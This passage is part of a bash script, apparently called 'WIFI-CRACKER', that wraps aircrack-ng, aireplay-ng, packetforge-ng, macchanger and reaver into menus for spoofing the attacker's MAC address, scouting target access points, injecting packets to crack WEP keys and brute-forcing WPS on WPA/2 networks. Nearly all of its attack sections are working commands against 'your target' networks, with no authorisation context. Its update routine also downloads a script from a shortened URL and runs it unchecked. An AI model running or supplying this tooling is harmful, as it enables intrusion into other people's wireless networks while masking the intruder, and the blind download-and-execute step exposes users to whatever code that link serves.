	echo -e "(E)       Exit WIFI-CRACK"
	echo -e ""
	echo -e " Others :"
	echo -e "(~) for debug MENU"
	echo -e "(hak5) for hak5 wifi workshop slides info..."
	echo -e ""
	local choice
	read -p "Enter choice : " choice
	case $choice in
		"m") macspoof_info ;;
		"t") scout_menu ;;
		"c") crack_menu ;;
		"s") sniff_menu ;;
		"d") deauth_menu ;;
		"U") update ;;
		"D") check_dep ;;
		"E") f_exit;;
		"M") main_menu ;;
		"~") debug ;;
		"hak5") hak5WS_menu ;;
		quit|qqq) exit 5 ;;
		*) echo -e "${RED}Error...${STD}" & sleep 2 & pause
	esac
	main_menu
}
###########################################################################################
update() {
	show_logo #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}###########################UPDATING  WIFI-CRACKER###########################${STD}"
	echo -e "${BANNER}#################################using wget#################################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	check_internet
	echo -e "${INFO}[~]: update...downloading${STD}"
	${S1}
	wget -O WIFI-CRACKER-by-root.sh http://db.tt/lNOstZya
	${S2}
	echo -e "${INFO}[~]: update...allowing to execute${STD}"
	${S1}
	chmod +x WIFI-CRACKER-by-root.sh
	${S2}
	echo -e "${INFO}[~]: update...running${STD}"
	${S1}
	./WIFI-CRACKER-by-root.sh	
	exit 3
	${S2}
}
#=========================================================================================#
###########################################################################################
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! MAC SPOOF OPTION !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!#
###########################################################################################
macspoof_info() {
	show_logo #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}#############################MAC SPOOFING START#############################${STD}"
	echo -e "${BANNER}##############################using macchanger##############################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	echo -e ""
	if [ ${MACINFO} != "ON" ]
	then
		while true
		do
			echo -e "${MESSAGE}[$]: YOU MUST PROVIDE YOUR INTERFACE AND DESIRED MAC ADDRESS IN ORDER TO PROCEED${STD}"
			change_macinfo
		done
	fi
	echo -e "${MESSAGE}[$]: YOU HAVE ALREADY PROVIDED A MAC ADDRESS TO SPOOF${STD}"
	pause
	macspoof_menu
}
###########################################################################################
get_mac() {
	CMAC=`ifconfig ${INTERFACE} | grep ${INTERFACE} | tr -s ' ' | cut -d ' ' -f5 | cut -c 1-17`
	CMAC2=`ifconfig ${INTERFACE2} | grep ${INTERFACE2} | tr -s ' ' | cut -d ' ' -f5 | cut -c 1-17`
}
#==================================== OW LOOK A MENU =====================================#
macspoof_menu() {
	show_logo
	get_mac
	echo -e "~~~~~~~~~~~~~~~~~~~~~"	
	echo -e "  MAC SPOOFING MENU"
	echo -e "~~~~~~~~~~~~~~~~~~~~~"
	echo -e "Your current MAC : ${CMAC} on ${INTERFACE}"
	echo -e "Your current MAC : ${CMAC2} on ${INTERFACE2}"
	echo -e "Your desired MAC : ${MAC}"
	echo -e "What you want to spoof (INTERFACE:${UIF}) (STATUS:${MACMODE})"
	echo -e "========================================="
	echo -e "(t) *MENU* Go to targeting menu"	
	echo -e "(c) *MENU* Go to cracking menu"
	echo -e "(~) *MENU* Debuging menu"
	echo -e "(M) *MENU* Exit to main menu"
	echo -e "(E)        Exit WIFI-CRACKER"
	echo -e "-------------------------------"
	echo -e "Please choose an option :"
	echo -e " 1.        Change to Random vendor MAC"
	echo -e " 2.        Change to Fully random MAC"
	echo -e " 3.        Change to Desired MAC"
	echo -e " 4.        Reset MAC"
	echo -e " 5.        Change the interface you want to spoof"	
	echo -e " 6.        Change the desired MAC"
	echo -e ""
	local choice
	read -p "Enter choice : " choice
	case $choice in
		1) macspoof_A ;;
		2) macspoof_r ;;
		3) macspoof_m ;;
		4) reset_mac ;;
		5) change_uif ;;
		6) change_mac ;;
		"t") scout_menu ;;
		"c") crack_menu ;;
		"M") main_menu ;;
		"E") f_exit;;
		"m") macspoof_info ;;
		"s") sniff_menu ;;
		"d") deauth_menu ;;
		"~") debug ;;
		hak5) hak5WS_menu ;;
		quit|qqq) exit 5 ;;
		*) echo -e "${RED}Error...${STD}" & sleep 2 & pause
	esac
	macspoof_menu
}
#=========================================================================================#
###########################################################################################
###########################################################################################
reset_mac() {
	show_logo
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}############################RESETING MAC ADDRESS############################${STD}"
	echo -e "${BANNER}##############################using macchanger##############################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${INFO}[~]: MAC reset is in progress."
	echo -e "${INFO}[~]: MAC reset is in progress..bringing wireless interface down"
	${S1}
	ifconfig ${UIF} down
	${S2}
	echo -e "${INFO}[~]: MAC reset is in progress...applying changes with macchanger"
	${S1}
	macchanger -p ${UIF}
	${S2}
	echo -e "${INFO}[~]: MAC reset is in progress....bringing wireless back up"
	${S1}
	ifconfig ${UIF} up
	${S2}
	echo -e "${INFO}[~]: MAC reset is in progress.....DONE!${STD}"
	MACMODE="OFF"
	echo -e ""
	sleep 3
}
###########################################################################################
###########################################################################################
change_mac(){
	show_logo #BANNER:
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}##########################CHANGING DESIRED MAC INFO#########################${STD}"
	echo -e "${BANNER}##############################using macchanger##############################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${CRITICAL}[!]: WHAT IS YOUR DESIRED MAC ??${STD}"
	read MAC
	echo -e "${INFO}[~]: Changed desired mac info!${STD}"
	sleep 2
}
change_uif(){
	show_logo #BANNER:
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}##########################CHANGING DESIRED INTERFACE########################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${CRITICAL}[!]: WHICH INTERFACE WOULD YOU LIKE TO SPOOF ??${STD}"
	read UIF
	echo -e "${INFO}[~]: Changed desired mac info!${STD}"
	sleep 2

}
change_macinfo() {
	show_logo #BANNER:
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}##########################CHANGING DESIRED MAC INFO#########################${STD}"
	echo -e "${BANNER}##############################using macchanger##############################${STD}"
	echo -e "${BANNER}############################################################################${STD}"

	echo -e "${CRITICAL}[!]: WHAT IS YOUR PRIMARY INTERFACE ??${STD}"
	read INTERFACE
	echo -e "${CRITICAL}[!]: WHAT IS YOUR MONITOR INTERFACE ??${STD}"
	read INTERFACE2
	echo -e "${CRITICAL}[!]: WHICH INTERFACE WOULD YOU LIKE TO SPOOF ??${STD}"
	read UIF
	echo -e "${CRITICAL}[!]: WHAT IS YOUR DESIRED MAC ADDRESS ??${STD}" 
	read MAC 
	echo -e "${MESSAGE}[$]: Your primary interface is       :${BLK} ${INTERFACE}${STD}"
	echo -e "${MESSAGE}[$]: Your monitor interface is       :${BLK} ${INTERFACE2}${STD}"
	echo -e "${MESSAGE}[$]: The interface you want to spoof :${BLK} ${INTERFACE2}${STD}"
	echo -e "${MESSAGE}[$]: Your desired MAC Address is     :${BLK} ${MAC}${STD}"
	local CONFIRM
	echo -e "${CRITICAL}[!]: Is this information corrent [Y/n]? ${STD}" 
	read CONFIRM 
	case $CONFIRM in
		y|Y|YES|yes|Yes) echo -e "${MESSAGE}[$]: Information has been provided...${STD}" & sleep 1 ;;
		*) echo -e "${CRITICAL}[!]: Please re-enter information${STD}" & sleep 2 & pause & change_mac
	esac

	pause
	MACINFO="ON"
	clear
	off_mon
	enable_mon
	macspoof_info
}
###########################################################################################
###########################################################################################
macspoof_A() {
	 #BANNER: 
	show_logo
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}############################SPOOFING MAC ADDRESS############################${STD}"
	echo -e "${BANNER}##############################using macchanger##############################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${INFO}[~]: MAC spoof is in progress."
	echo -e "${INFO}[~]: MAC spoof is in progress..bringing wireless interface down"
	${S1}
	ifconfig ${UIF} down
	${S2}
	echo -e "${INFO}[~]: MAC spoof is in progress...applying changes with macchanger"
	${S1}
	macchanger -A ${UIF}
	${S2}
	echo -e "${INFO}[~]: MAC spoof is in progress....bringing wireless back up"
	${S1}
	ifconfig ${UIF} up
	${S2}
	echo -e "${INFO}[~]: MAC spoof is in progress.....DONE!${STD}"
	MACMODE="ON"
	pause
}
macspoof_r() {
	 #BANNER: 
	show_logo
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}############################SPOOFING MAC ADDRESS############################${STD}"
	echo -e "${BANNER}##############################using macchanger##############################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${INFO}[~]: MAC spoof is in progress."
	echo -e "${INFO}[~]: MAC spoof is in progress..bringing wireless interface down"
	${S1}
	ifconfig ${UIF} down
	${S2}
	echo -e "${INFO}[~]: MAC spoof is in progress...applying changes with macchanger"
	${S1}
	macchanger -r ${UIF}
	${S2}
	echo -e "${INFO}[~]: MAC spoof is in progress....bringing wireless back up"
	${S1}
	ifconfig ${UIF} up
	${S2}
	echo -e "${INFO}[~]: MAC spoof is in progress.....DONE!${STD}"
	MACMODE="ON"
	pause
}
macspoof_m() {
	 #BANNER: 
	show_logo
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}############################SPOOFING MAC ADDRESS############################${STD}"
	echo -e "${BANNER}##############################using macchanger##############################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${INFO}[~]: MAC spoof is in progress."
	echo -e "${INFO}[~]: MAC spoof is in progress..bringing wireless interface down"
	${S1}
	ifconfig ${UIF} down
	${S2}
	echo -e "${INFO}[~]: MAC spoof is in progress...applying changes with macchanger"
	${S1}
	macchanger -m ${MAC} ${UIF}
	${S2}
	echo -e "${INFO}[~]: MAC spoof is in progress....bringing wireless back up"
	${S1}
	ifconfig ${UIF} up
	${S2}
	echo -e "${INFO}[~]: MAC spoof is in progress.....DONE!${STD}"
	MACMODE="ON"
	pause
}
###########################################################################################
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! SCOUTING OPTION !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!#
###########################################################################################
#==================================== OW LOOK A MENU =====================================#
scout_menu() {
	show_logo
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~"	
	echo -e "  TARGET SCOUTING MENU"
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo -e "${MESSAGE}[$]: WHILE SCOUTING REMEMBER YOUR TARGET'S BSSID, CHANNEL, ESSID, etc. ${STD}"
	echo -e "${MESSAGE}[$]: YOU WILL BE PROMPTED TO SAVE THIS INFO AFTER A SCOUTING SESSION ${STD}"	
	echo -e "========================================================================"
	echo -e "YOUR PRIMARY INTERFACE IS : ${INTERFACE}   ;  YOUR MONITOR INTERFACE IS : ${INTERFACE2}"
	echo -e "========================================================================"
	echo -e "(c) *MENU* Continue to the cracking menu"
	echo -e "(~) *MENU* Visit Debuging menu"
	echo -e "(M) *MENU* Exit to main menu"
	echo -e "(E)        Exit WIFI-CRACKER"
	echo -e "----------------------------------"
	echo -e "Please choose an option"
	echo -e "1.        Start scouting for WEP Targets"
	echo -e "2.        Start scouting for ALL Targets"
	echo -e "3.        Tell WIFI-CRACKER monitor mode status (STATUS: ${MONMODE})"
	echo -e "4.        Turn ON monitor mode (STATUS: ${MONMODE})"
	echo -e "5.        Turn OFF monitor mode (STATUS: ${MONMODE})"
	echo -e "6.        Change you primary and monitoring interfaces' name"
	local choice
	read -p "Enter choice : " choice
	case $choice in
		1) scout_wep ;;
		2) scout_all ;;
		3) change_mon ;;
		4) enable_mon ;;
		5) off_mon ;;
		6) ask_ifaces ;;
		"c") crack_menu ;;
		"M") main_menu ;;
		"E") f_exit ;;
		m) macspoof_info ;;
		t) scout_menu ;;
		s) sniff_menu ;;
		d) deauth_menu ;;
		"~") debug ;;
		hak5) hak5WS_menu ;;
		quit|qqq) exit 5 ;;
		*) echo -e "${RED}Error...${STD}" & sleep 2 & pause
	esac
	scout_menu
}
#=========================================================================================#
change_mon() {	
	echo -e "${CRITICAL}[?]: Select 1. OFF or 2. ON for monitor interface mode (STATUS: ${MONMODE})${STD}"
	local choice
	read -p "Enter choice : " choice
	case $choice in
		1) MONMODE="OFF" ;;
		2) MONMODE="ON" ;;
		*) change_mon ;;
	esac
}
###########################################################################################
enable_mon() {
	show_logo #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}###########################ENABLING MONITOR MODE############################${STD}"
	echo -e "${BANNER}##############################using airomon-ng##############################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	${S1}	
	airmon-ng stop mon0
	airmon-ng stop mon1
	airmon-ng stop ${INTERFACE2}
	airmon-ng stop ${INTERFACE}
	airmon-ng start ${INTERFACE}
	${S2}
	MONMODE="ON"
}
###########################################################################################
off_mon() {
	show_logo #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}#########################TURNNING OFF MONITOR MODE##########################${STD}"
	echo -e "${BANNER}##############################using airomon-ng##############################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	${S1}
	airmon-ng stop mon0
	airmon-ng stop mon1
	airmon-ng stop ${INTERFACE2}
	airmon-ng stop ${INTERFACE}
	${S2}
	MONMODE="OFF"
}
###########################################################################################
ask_ifaces() {
	show_logo #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}##########################CHANGING USED INTERFACES##########################${STD}"
	echo -e "${BANNER}############################################################################${STD}"

	echo -e "${CRITICAL}[?]: WHAT IS YOUR PRIMARY INTERFACE ?? ${BLK}" & read INTERFACE
	echo -e "${CRITICAL}[?]: WHAT IS YOUR MONITOR INTERFACE ?? ${BLK}" & read INTERFACE2
	echo -e "${MESSAGE}[$]: Your primary interface is :${BLK} ${INTERFACE}"
	echo -e "${MESSAGE}[$]: Your monitor interface is :${BLK} ${INTERFACE2}${STD}"
	local CONFIRM
	echo -e "${CRITICAL}[?]: Is this information correct [Y/n]? ${BLK}" 
	read CONFIRM 
	echo -e "${STD}"
	case $CONFIRM in
		y|Y|YES|yes|Yes) echo -e "${MESSAGE}[$]: Information provided...${STD}" & sleep 1;;
		*) echo -e "${MESSAGE}[$]: Please re-enter information${STD}" & sleep 2 & ask_ifaces
	esac
	pause
}
###########################################################################################
###########################################################################################
scout_wep() {
	show_logo #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}##########################SCOUTING FOR WEP TARGETS##########################${STD}"
	echo -e "${BANNER}##############################using  airodump###############################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	pre_crack
	echo -e "${MESSAGE}[$]: use CTRL+C to exit airodump once you've picked a target and took all"
	echo -e "${MESSAGE}[$]: the info you need. ${STD}"
	pause
	${S1}
	airodump-ng --encrypt WEP ${INTERFACE2}
	sleep 0.01
	${S2}
	local CONFIRM
	echo -e "${CRITICAL}[?]: WOULD YOU LIKE TO WRITE DOWN YOUR TARGET'S INFO NOW [Y/n]? ${BLK}"
	read CONFIRM
	sleep 0.01
	echo -e "${STD}"
	case $CONFIRM in
		y|Y|YES|yes|Yes) change_target ;;
		*) echo -e "${RED}[$]: YOUR CHOICE, BACK TO MENU...${STD}" & sleep 2;;
	esac
}
###########################################################################################
###########################################################################################
scout_all() {
	show_logo #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}############################SCOUTING FOR TARGETS############################${STD}"
	echo -e "${BANNER}##############################using  airodump###############################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	pre_crack
	echo -e "${MESSAGE}[$]: use CTRL+C to exit airodump once you've picked a target and took all"
	echo -e "${MESSAGE}[$]: the info you need. ${STD}"
	pause
	${S1}
	airodump-ng ${INTERFACE2}
	sleep 0.01
	${S2}	
	local CONFIRM
	echo -e "${CRITICAL}[?]: WOULD YOU LIKE TO WRITE DOWN YOUR TARGET'S INFO NOW [Y/n]? ${BLK}"
	read CONFIRM
	sleep 0.01	
	echo -e "${STD}"
	case $CONFIRM in
		y|Y|YES|yes|Yes) change_target ;;
		*) echo -e "${RED}[$]: YOUR CHOICE, BACK TO MENU...${STD}" & sleep 2;;
	esac
}
###########################################################################################
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! CRACKING OPTION !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!#
###########################################################################################
#==================================== OW LOOK A MENU =====================================#
crack_menu() {
	show_logo
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~"	
	echo -e "  CRACKING WIFI MENU"
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~"
	echo -e "========================================================================"
	echo -e "YOUR PRIMARY INTERFACE IS : ${INTERFACE}   ;  YOUR MONITOR INTERFACE IS : ${INTERFACE2}"
	echo -e "SAVE FILENAME : ${FILE}   YOUR CURRENT MAC IS : ${CMAC}"
	echo -e "========================================================================"
	echo -e "TARGET BSSID : ${BSSID}   TARGET CHANNEL : ${CHANNEL}"
	echo -e "TARGET ESSID : ${ESSID}	CURRENTLY CRACKED WIFI KEY : ${KEY}"  
	echo -e "========================================================================"
	echo -e "   Have you changed your MAC yet? (STATUS: ${MACMODE})"
	echo -e "(m) *MENU* Visit Mac spoofing menu"
	echo -e "   Haven't selected a target yet?"
	echo -e "(t) *MENU* Visit Target scouting menu"
	echo -e "(~) *MENU* Visit Debugging menu"
	echo -e "(M) *MENU* Exit to main menu"
	echo -e "(E)        Exit WIFI-CRACKER"
	echo -e "---------------------------------------"
	echo -e "Please choose an option : "
	echo -e " 1.        Changer your target's information"
	echo -e " 2.  WEP - Passive crack (No package generation)"
	echo -e " 3.  WEP - Active crack (might make AP unusable while attacking)"
	echo -e " 4.  WEP - Active crack with Fragmentation attack"
	echo -e " 5.  WEP - Crack a previously saved session of airodump (METHOD 1)"
	echo -e " 6.  WEP - Crack a previously saved session of airodump (METHOD 2)"
	echo -e " 7.        Use aircrack-ng (any command you want)"	       
	echo -e " 8.  WPA - Crack WPA/2(if enabled WPS) with Reaver"
	echo -e " 9.  WPA - Continue previous Reaver session"
	echo -e "10.  WPA - Bruteforce WPA2/PSK AP with a connected station and a wordlist *NEW*"
	echo -e "11.        Change you primary and monitoring interfaces' name"
	echo -e "12.        Tell WIFI-CRACKER monitor mode status (STATUS: ${MONMODE})"
	echo -e "13.        Turn ON monitor mode (STATUS: ${MONMODE})"
	echo -e "14.        Turn OFF monitor mode (STATUS: ${MONMODE})"
	local choice
	read -p "Enter choice : " choice
	case $choice in
		1) change_target ;;
		2) passive_wepcrack ;;
		3) wepcrack ;;
		4) wepcrack2_frag ;;
		5) wepfile_crack ;;
		6) wepfile_crack2 ;;		
		7) aircrack ;;
		8) wpacrack ;;
		9) wpacrack_continue ;;
		10) wpa_hash&smash ;;
		11) ask_ifaces ;;
		12) change_mon ;;
		13) enable_mon ;;
		14) off_mon ;;
		"m") macspoof_info ;;
		"t") scout_menu ;;
		"M") main_menu ;;
		"E") f_exit ;;
		"c") crack_menu ;;
		"s") sniff_menu ;;
		"d") deauth_menu ;;
		"~") debug ;;
		hak5) hak5WS_menu ;;
		quit|qqq) exit 5 ;;
		*) echo -e "${RED}Error...${STD}" & sleep 2 & pause
	esac
	crack_menu
}
###########################################################################################
change_target() {
	echo -e ""
	echo -e "" #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}########################CHANGING TARGET INFORMATION#########################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${CRITICAL}[?]: WHAT IS YOUR TARGET'S BSSID (ITS MAC ADDRESS)?? ${BLK}" 
	read BSSID 
	echo -e "${STD}"
	echo -e "${CRITICAL}[?]: WHAT IS YOUR TARGET'S CHANNEL ?? ${BLK}"
	read CHANNEL
	echo -e "${STD}"
	echo -e "${CRITICAL}[?]: WHAT IS YOUR TARGET'S ESSID (THE NAME YOU SEE) ?? ${BLK}"
	read ESSID
	echo -e "${STD}"
	echo -e "${CRITICAL}[?]: WHAT IS YOUR DESIRED FILENAME FOR AIRODUMP SESSION ?? ${BLK}"
	read FILE 
	echo -e "${STD}"
	echo -e "${MESSAGE}[$]: Your target's BSSID                :${BLK} ${BSSID}${STD}"
	echo -e "${MESSAGE}[$]: Your target's channel              :${BLK} ${CHANNEL}${STD}"
	echo -e "${MESSAGE}[$]: Your target's ESSID                :${BLK} ${ESSID}${STD}"
	echo -e "${MESSAGE}[$]: Your airodump session file name is :${BLK} ${FILE}${STD}"
	local CONFIRM
	echo -e "${CRITICAL}[?]: Is this information corrent [Y/n]? ${BLK}"
	read CONFIRM
	echo -e "${STD}"
	case $CONFIRM in
		y|Y|YES|yes|Yes) echo -e "${MESSAGE}[$]: Information has been provided...${STD}" & sleep 1 ;;
		*) echo -e "${MESSAGE}[$]: Please re-enter information${STD}" & sleep 2 & pause & change_target
	esac
}
###########################################################################################
pre_crack() {
	show_logo
	echo -e ""
	echo -e "${INFO}[~]: checking mac address spoof......${STD}"	
	case ${MACMODE} in
		"ON") echo -e "${CRITICAL}[!]: MAC MODE IS ALREADY SPOOFED!${STD}" & sleep 2 ;;
		"OFF") macspoof;;
		*) echo -e "${RED}Error...${STD}" & sleep 2 & pause & exit;;
	esac
	echo -e "${INFO}[~]: checking mac address spoof......DONE!${STD}"
	echo -e ""
	echo -e "${INFO}[~]: checking monitor mode......${STD}"
	case ${MONMODE} in
		"ON") echo -e "${CRITICAL}[!]: MONITOR MODE IS ALREADY ON!${STD}" & sleep 2 ;;
		"OFF") enable_mon;;
		*) echo -e "${RED}Error...${STD}" & sleep 2 & pause & exit;;
	esac
	echo -e "${INFO}[~]: checking monitor mode......DONE!${STD}"
	sleep 3
}
###########################################################################################
start_wepcrack() {
	pre_crack
	show_logo #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}############################### CRACKING WEP ###############################${STD}"
	echo -e "${BANNER}###########################using  aircrack suite############################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	echo -e ""
	echo -e "${CRITICAL}[!]: YOU NEED AT LEAST 50000 DATA PACKETS FOR AIRCRACK TO WORK!${STD}"
	pause
}
###########################################################################################
passive_wepcrack() {
	start_wepcrack
	echo -e "${MESSAGE}[*] STEP 1 : START AIRODUMP IN NEW WINDOW${STD}"
	sleep 5
	${S1}
	${TERMINAL} -e "airodump-ng -c ${CHANNEL} -w ${FILE} --bssid ${BSSID} ${INTERFACE}" & AIRODUMPPID=$!	
	${S2}
	echo -e "-e "${MESSAGE}[*]STEP 2 : WAIT A VERY LONG TIME"
	sleep 5
	echo -e "${CRITICAL}[!]: CONTINUE ONLY WHEN #DATA > 50000 ${STD}" 
	pause
	echo -e "${MESSAGE}[*] STEP 3 : CRACK FILE${STD}"
	sleep 30
	wepfile_crack
	echo -e "${INFO}[~]: killing processes...${STD}"
	${S1}	
	kill ${AIRODUMPPID}
	sleep 0.01
	${S2}
	echo -e "${INFO}[~]: killing processes...DONE!${STD}"
	pause
	clean_up
}
###########################################################################################
wepcrack() {
	start_wepcrack
	echo -e "${MESSAGE}[*] STEP 1 : START AIRODUMP IN NEW WINDOW${STD}"
	sleep 5
	${S1}
	${TERMINAL} -e "airodump-ng -c ${CHANNEL} -w ${FILE} --bssid ${BSSID} ${INTERFACE}" & AIRODUMPPID=$!
	sleep 0.01
	${S2}
	echo -e "${MESSAGE}[*] STEP 2 : FAKE AUTH${STD}"	
	sleep 5
	${S1}
	aireplay-ng -1 0 -a ${BSSID} -h ${CMAC2} -e ${ESSID} ${INTERFACE2}
	sleep 0.01
	${S2}
	echo -e "${MESSAGE}[*] STEP 3 : GENERATE PACKETS${STD}"	
	sleep 2
	${S1}
	${TERMINAL} -e "aireplay-ng -3 -b ${BSSID} -h ${CMAC2} ${INTERFACE2}" & AIREPLAYPID=$!
	sleep 0.01
	${S2}
	echo -e "${MESSAGE}[*] STEP 4 : WAIT A LITTLE BIT${STD}" 	
	echo -e "${CRITICAL}[!]: CONTINUE ONLY WHEN #DATA > 50000 ${STD}" 
	pause
	echo -e "${MESSAGE}[*] STEP 5 : CRACK FILE${STD}"
	sleep 30
	wepfile_crack
	echo -e "${INFO}[~]: killing processes...${STD}"
	${S1}
	kill ${AIRODUMPPID} & kill ${AIREPLAYPID}
	sleep 0.01
	${S2}
	echo -e "${INFO}[~]: killing processes...DONE!${STD}"	
	pause
	clean_up
}
###########################################################################################
wepcrack2_frag() {
	start_wepcrack
	echo -e "${MESSAGE}[*] STEP 1 : START AIRODUMP IN NEW WINDOW${STD}"
	sleep 5
	${S1}
	${TERMINAL} -e "airodump-ng -c ${CHANNEL} --bssid ${BSSID} --ivs -w capture ${INTERFACE}" & AIRODUMPPID=$!
	sleep 0.01
	${S2}
	sleep 2
	echo -e "${MESSAGE}[*] STEP 2 : ASSOCIATE THEN FRAGMETATIONG ATTACK${STD}"
	sleep 5
	${S1}
	aireplay-ng -1 0 -a ${BSSID} -h ${CMAC2} ${INTERFACE2}
	aireplay-ng -5 -b ${BSSID} -h ${CMAC2} ${INTERFACE2}
	packetforge-ng -0 -a ${BSSID} -h ${CMAC2} -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w arp-packet ${INTERFACE2}
	${TERMINAL} -e "aireplay-ng -2 -r arp-packet ${INTERFACE2}" & AIREPLAYPID=$!
	sleep 0.01
	${S2}
	echo -e "${MESSAGE}[*] STEP 3 : WAIT${STD}"
	sleep 5
	echo -e "${CRITICAL}[!]: CONTINUE ONLY WHEN #DATA > 50000 ${STD}" 
	pause
	echo -e "${MESSAGE}[*] STEP 4 : CRACK FILE${STD}"
	sleep 30
	wepfile_crack2
	echo -e "${INFO}[~]: killing processes...${STD}"
	${S1}
	kill ${AIRODUMPPID} & kill ${AIREPLAYPID}
	sleep 0.01
	${S2}
	echo -e "${INFO}[~]: killing processes...DONE!${STD}"	
	sleep 5
	clean_up
}
###########################################################################################
wepfile_crack() {
	show_logo #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}###############################CRACKING FILE################################${STD}"
	echo -e "${BANNER}##############################using  aircrack###############################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	echo -e ""
	echo -e "${MESSAGE}[$]: YOUR CURRENT FILE NAME IS :${BLK} ${FILE}${STD}" 
 	local CONFIRM 
	echo -e "${CRITICAL}[?]: Would you like to change that?? [Y/n] ${BLK}" 
	read CONFIRM
	case $CONFIRM in
		y|Y|YES|yes|Yes) echo -e "" & echo -e "${CRITICAL}[?]: What is the file name (without -01.cap) ?? ${STD}" & read FILE & sleep 1 ;;
		*) echo -e "${MESSAGE}[$]: ALRIGHT, CONTINUING....${STD}"
	esac
	echo -e "${INFO}[~]: STARTING UP AIRCRACK TO RETRIEVE KEY FROM FILE"
	echo -e "${MESSAGE}[$]: DEPENDING ON HOW MUCH PACKETS YOU'VE CAPTURED THIS COULD TAKE SOME TIME${STD}"
	pause
	${S1}
	aircrack-ng -b ${BSSID} ${FILE}*.cap
	sleep 0.01
	${S2}		
	local CONFIRM2
	echo -e "${CRITICAL}[?]: Did aircrack-ng find the key [Y/n/cancel]${BLK}"
	read CONFIRM2 
	echo -e "${STD}"
 	case $CONFIRM2 in
    		y|Y|YES|yes|Yes|cancel|CANCEL|c|C)  echo -e "${MESSAGE}[$]: AIRCRACK WEP CRACK COMPLETED! ${STD}" ;;
    		*) echo -e "${MESSAGE}[$]: ATTEMPTING TO CRACK AGAIN${STD}" & sleep 1 & wepfile_crack
  	esac
	echo -e "${CRITICAL}[!]: DROP ALL THE ":" AND USE THE KEY AS PASSWORD TO CONNECT${STD}"
	store_key
	pause
}
###########################################################################################
wepfile_crack2() {
	show_logo #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}##########################CRACKING FILE (METHOD 2)##########################${STD}"
	echo -e "${BANNER}##############################using  aircrack###############################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${INFO}[~]: STARTING UP AIRCRACK TO RETRIEVE KEY FROM FILE"
	echo -e "${MESSAGE}[$]: THE FILE IS ANY .ivs THAT MATCHES YOUR CURRENT TARGET BSSID"
	echo -e "${MESSAGE}[$]: DEPENDING ON HOW MUCH PACKETS YOU'VE CAPTURED THIS COULD TAKE SOME TIME${STD}"
	pause
	${S1}		
	aircrack-ng -n 128 -b ${BSSID} *.ivs
	sleep 0.01
	${S2}
	echo -e "${CRITICAL}[?]: Did aircrack-ng find the key [Y/n/cancel]${BLK}"
	read CONFIRM
	case $CONFIRM in
		y|Y|YES|yes|Yes|cancel|CANCEL|c|C)  echo -e "${MESSAGE}[$]: AIRCRACK WEP CRACK COMPLETED! ${STD}" ;;
		*) echo -e "${MESSAGE}[$]: ATTEMPTING TO CRACK AGAIN${STD}" & pause & wepfile_crack2
	esac
	echo -e "${CRITICAL}[!]: DROP ALL THE ":" AND USE THE KEY AS PASSWORD TO CONNECT${STD}"
	store_key
	pause
}
###########################################################################################
wpacrack() {
	pre_crack
	show_logo #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}######################CRACKING WPA/2 PROTECTED NETWORK######################${STD}"
	echo -e "${BANNER}################################using reaver################################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${MESSAGE}[$]: BE SURE THAT YOU'VE ADDED THE TARGET INFORMATION FOR A WPA/2 AP"
	echo -e "${MESSAGE}[$]: NOW LAUNCHING REAVER TO CRACK WPA/2. THIS CAN TAKE FROM 4 TO 10 HOURS"
	echo -e "${CRITICAL}[!]: SIGNAL MUST BE STRONG FOR REAVER TO WORK PROPERLY!!!${STD}"	
	pause
	${S1}	
	reaver -i ${INTERFACE2} -b ${BSSID} -c ${CHANNEL} -e ${ESSID} -a -vv
	sleep 0.01
	${S2}	
	store_key
	pause
}
###########################################################################################
